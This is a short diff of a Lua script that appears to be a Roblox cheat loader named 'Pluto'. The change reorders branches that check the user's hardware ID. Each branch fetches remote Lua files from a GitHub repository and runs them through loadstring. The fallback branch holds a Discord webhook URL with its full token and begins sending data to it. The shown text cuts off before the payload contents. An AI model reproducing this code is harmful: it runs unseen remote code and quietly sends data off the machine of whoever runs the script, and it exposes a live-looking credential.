@@ -20,11 +20,11 @@ function CheckHWID(hwidval)
 end
 
 dsf2h9ef7h2 = CheckHWID(HWID)
-
-if dsf2h9ef7h2 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/k4alt/pluto/main/msrc.lua"))()
-elseif Pluto.Misc.Resolver then
+if Pluto.Misc.Resolver then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/k4alt/pluto/main/streamable.lua"))()
+elseif dsf2h9ef7h2 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/k4alt/pluto/main/msrc.lua"))()
+else
     local webh = "https://discord.com/api/webhooks/1109655284655337504/9-Pu6XDQdCxu-40yJ0-4jAS9PfbEeADs6o3gBa9AySaAkDTRCnqBbJmtFYHuK8KCk2C7"
     pcall(function()
         local data = {
